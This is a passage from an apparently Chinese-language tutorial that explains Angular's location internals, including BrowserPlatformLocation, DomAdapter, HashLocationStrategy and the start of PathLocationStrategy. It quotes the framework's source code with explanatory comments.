</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>通过以上代码，我们可以知道在浏览器环境中，HashLocationStrategy 构造函数中注入的 PlatformLocation 对象是 BrowserPlatformLocation 类的实例。我们也先来看一下 BrowserPlatformLocation 类的构造函数：</p> <h3 id="browserplatformlocation"><a href="#browserplatformlocation" class="header-anchor">#</a> BrowserPlatformLocation</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/platform-browser/src/browser/location/browser_platform_location.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">BrowserPlatformLocation</span> <span class="token keyword">extends</span> <span class="token class-name">PlatformLocation</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> _location<span class="token operator">:</span> Location<span class="token punctuation">;</span>
  <span class="token keyword">private</span> _history<span class="token operator">:</span> History<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">@<span class="token function">Inject</span><span class="token punctuation">(</span><span class="token constant">DOCUMENT</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _doc<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_location <span class="token operator">=</span> <span class="token function">getDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取浏览器平台下Location对象</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_history <span class="token operator">=</span> <span class="token function">getDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHistory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取浏览器平台下的History对象</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>在 BrowserPlatformLocation 构造函数中，我们调用 _init() 方法，在方法体中，我们调用 getDOM() 方法返回对象中的 getLocation() 和 getHistory() 方法，分别获取 Location 对象和 History 对象。那 getDOM() 方法返回的是什么对象呢？其实该方法返回的是 DomAdapter 对象。</p> <h3 id="domadapter"><a href="#domadapter" class="header-anchor">#</a> DomAdapter</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> _DOM<span class="token operator">:</span> DomAdapter <span class="token operator">=</span> <span class="token keyword">null</span> <span class="token operator">!</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">getDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> _DOM<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">setDOM</span><span class="token punctuation">(</span><span class="token parameter">adapter<span class="token operator">:</span> DomAdapter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  _DOM <span class="token operator">=</span> adapter<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">setRootDomAdapter</span><span class="token punctuation">(</span><span class="token parameter">adapter<span class="token operator">:</span> DomAdapter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>_DOM<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    _DOM <span class="token operator">=</span> adapter<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>那什么时候会调用 setDOM() 或 setRootDomAdapter() 方法呢？通过查看 Angular 源码，我们发现在浏览器平台初始化时，会调用 setRootDomAdapter() 方法。具体如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">INTERNAL_BROWSER_PLATFORM_PROVIDERS</span><span class="token operator">:</span> Provider<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">PLATFORM_INITIALIZER</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> initDomAdapter<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token operator">...</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="initdomadapter"><a href="#initdomadapter" class="header-anchor">#</a> initDomAdapter</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">initDomAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  BrowserDomAdapter<span class="token punctuation">.</span><span class="token function">makeCurrent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  BrowserGetTestability<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>从上面代码中，可以看出在 initDomAdapter() 方法中，我们又调用了 BrowserDomAdapter 类提供的静态方法 makeCurrent() ，该方法的实现如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">BrowserDomAdapter</span> <span class="token keyword">extends</span> <span class="token class-name">GenericBrowserDomAdapter</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token function">makeCurrent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">setRootDomAdapter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BrowserDomAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>现在我们已经知道调用 getDom() 方法后，我们获得的是 BrowserDomAdapter 对象。该对象为我们提供 getLocation() 和 getHistory() 方法，用于获取 Location 和 History 对象。以上两个方法的具体实现如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">getHistory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> History <span class="token punctuation">{</span> <span class="token keyword">return</span> window<span class="token punctuation">.</span>history<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Location <span class="token punctuation">{</span> <span class="token keyword">return</span> window<span class="token punctuation">.</span>location<span class="token punctuation">;</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="getbasehref"><a href="#getbasehref" class="header-anchor">#</a> getBaseHref</h3> <p>此外该对象中还包含一个 getBaseHref() 方法，用于获取基础路径：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">getBaseHref</span><span class="token punctuation">(</span>doc<span class="token operator">:</span> Document<span class="token punctuation">)</span><span class="token operator">:</span> string<span class="token operator">|</span><span class="token keyword">null</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> href <span class="token operator">=</span> <span class="token function">getBaseElementHref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> href <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token function">relativePath</span><span class="token punctuation">(</span>href<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 获取入口文件中base元素的href属性值</span>
<span class="token keyword">function</span> <span class="token function">getBaseElementHref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string<span class="token operator">|</span><span class="token keyword">null</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>baseElement<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    baseElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">)</span> <span class="token operator">!</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>baseElement<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> baseElement<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>分析完 BrowserPlatformLocation 类的构造函数，我们再来分析该类中几个重要的方法：</p> <h3 id="platformlocation实例方法"><a href="#platformlocation实例方法" class="header-anchor">#</a> PlatformLocation实例方法</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 用于获取base元素的href属性</span>
<span class="token function">getBaseHrefFromDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">getDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBaseHref</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_doc<span class="token punctuation">)</span> <span class="token operator">!</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token comment">// 设置popstate事件的监听函数</span>
<span class="token function">onPopState</span><span class="token punctuation">(</span>fn<span class="token operator">:</span> LocationChangeListener<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token function">getDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getGlobalEventTarget</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_doc<span class="token punctuation">,</span> <span class="token string">'window'</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'popstate'</span><span class="token punctuation">,</span> fn<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">interface</span> <span class="token class-name">LocationChangeListener</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>e<span class="token operator">:</span> LocationChangeEvent<span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">interface</span> <span class="token class-name">LocationChangeEvent</span> <span class="token punctuation">{</span> type<span class="token operator">:</span> string<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token comment">// 设置hashchange事件的监听函数</span>
<span class="token function">onHashChange</span><span class="token punctuation">(</span>fn<span class="token operator">:</span> LocationChangeListener<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token function">getDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getGlobalEventTarget</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_doc<span class="token punctuation">,</span> <span class="token string">'window'</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'hashchange'</span><span class="token punctuation">,</span> fn<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 添加会话历史状态</span>
<span class="token function">pushState</span><span class="token punctuation">(</span>state<span class="token operator">:</span> any<span class="token punctuation">,</span> title<span class="token operator">:</span> string<span class="token punctuation">,</span> url<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">supportsState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> title<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_location<span class="token punctuation">.</span>hash <span class="token operator">=</span> url<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 判断是否支持state相关API</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">supportsState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token operator">!</span>window<span class="token punctuation">.</span>history<span class="token punctuation">.</span>pushState<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 修改会话历史状态</span>
<span class="token function">replaceState</span><span class="token punctuation">(</span>state<span class="token operator">:</span> any<span class="token punctuation">,</span> title<span class="token operator">:</span> string<span class="token punctuation">,</span> url<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">supportsState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> title<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_location<span class="token punctuation">.</span>hash <span class="token operator">=</span> url<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 进入会话历史记录中的下一个页面</span>
<span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_history<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token comment">// 进入会话历史记录中的上一个页面</span>
<span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br></div></div><h3 id="hashlocationstrategy实例方法"><a href="#hashlocationstrategy实例方法" class="header-anchor">#</a> HashLocationStrategy实例方法</h3> <p>现在终于介绍完 PlatformLocation 对象，让我们回过头来继续分析我们的主角 - HashLocationStrategy 类。前面我们已经分析了该类的构造函数，我们再来看一下该类其它的方法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/common/src/location/hash_location_strategy.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">HashLocationStrategy</span> <span class="token keyword">extends</span> <span class="token class-name">LocationStrategy</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> _baseHref<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> <span class="token comment">// 用于保存base URL地址</span>

  <span class="token function">onPopState</span><span class="token punctuation">(</span>fn<span class="token operator">:</span> LocationChangeListener<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">onPopState</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">onHashChange</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 获取基础路径</span>
  <span class="token function">getBaseHref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_baseHref<span class="token punctuation">;</span> <span class="token punctuation">}</span>
  
  <span class="token comment">// 获取hash路径</span>
  <span class="token function">path</span><span class="token punctuation">(</span>includeHash<span class="token operator">:</span> boolean <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span>
    <span class="token comment">// the hash value is always prefixed with a `#`</span>
    <span class="token comment">// and if it is empty then it will stay empty</span>
    <span class="token keyword">let</span> path <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span>hash<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>path <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> path <span class="token operator">=</span> <span class="token string">'#'</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> path<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">:</span> path<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 基于_baseHref及internal值，生成完整的URL地址</span>
  <span class="token function">prepareExternalUrl</span><span class="token punctuation">(</span>internal<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span>
    <span class="token comment">// joinWithSlash()：该方法会判断_baseHref和internal是否含有'/'</span>
    <span class="token comment">// 字符，然后自动帮我们拼接成合法的URL地址</span>
    <span class="token keyword">const</span> url <span class="token operator">=</span> Location<span class="token punctuation">.</span><span class="token function">joinWithSlash</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_baseHref<span class="token punctuation">,</span> internal<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> url<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token string">'#'</span> <span class="token operator">+</span> url<span class="token punctuation">)</span> <span class="token operator">:</span> url<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 添加会话历史状态</span>
  <span class="token function">pushState</span><span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">:</span> any<span class="token punctuation">,</span> title<span class="token operator">:</span> string<span class="token punctuation">,</span> path<span class="token operator">:</span> string<span class="token punctuation">,</span> queryParams<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// normalizeQueryParams()：该方法会判断queryParams是否包含'?'</span>
    <span class="token comment">// 字符，若不包含，则自动添加'?'字符。</span>
    <span class="token keyword">let</span> url<span class="token operator">:</span> string<span class="token operator">|</span><span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">prepareExternalUrl</span><span class="token punctuation">(</span>path <span class="token operator">+</span>
          Location<span class="token punctuation">.</span><span class="token function">normalizeQueryParams</span><span class="token punctuation">(</span>queryParams<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      url <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span>pathname<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> title<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 更新会话历史状态</span>
  <span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">:</span> any<span class="token punctuation">,</span> title<span class="token operator">:</span> string<span class="token punctuation">,</span> path<span class="token operator">:</span> string<span class="token punctuation">,</span> queryParams<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> url <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">prepareExternalUrl</span><span class="token punctuation">(</span>path <span class="token operator">+</span> 
          Location<span class="token punctuation">.</span><span class="token function">normalizeQueryParams</span><span class="token punctuation">(</span>queryParams<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      url <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span>pathname<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> title<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 进入会话历史记录中的下一个页面</span>
  <span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

  <span class="token comment">// 进入会话历史记录中的上一个页面</span>
  <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_platformLocation<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br></div></div><p>到现在为止，我们已经完整分析了 HashLocationStrategy 策略。最后我们来分析 PathLocationStrategy 策略。</p> <h3 id="pathlocationstrategy"><a href="#pathlocationstrategy" class="header-anchor">#</a> PathLocationStrategy</h3> <p>PathLocationStrategy 类也是继承于 LocationStrategy 抽象类，如果使用该策略，我们必须设置 APP_BASE_HREF 或在入口文件如 (index.html) 文件中设置 </p><base> 元素的 href 属性。我们也先来分析该类的构造函数：<p></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/common/src/location/path_location_strategy.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">PathLocationStrategy</span> <span class="token keyword">extends</span> <span class="token class-name">LocationStrategy</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> _baseHref<span class="token operator">:</span> string<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span>
      <span class="token parameter"><span class="token keyword">private</span> _platformLocation<span class="token operator">:</span> PlatformLocation<span class="token punctuation">,</span>
      @<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Inject</span><span class="token punctuation">(</span><span class="token constant">APP_BASE_HREF</span><span class="token punctuation">)</span> href<span class="token operator">?</span><span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span>href <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token comment">// 若未设置APP_BASE_HREF的值，则从base元素中</span>
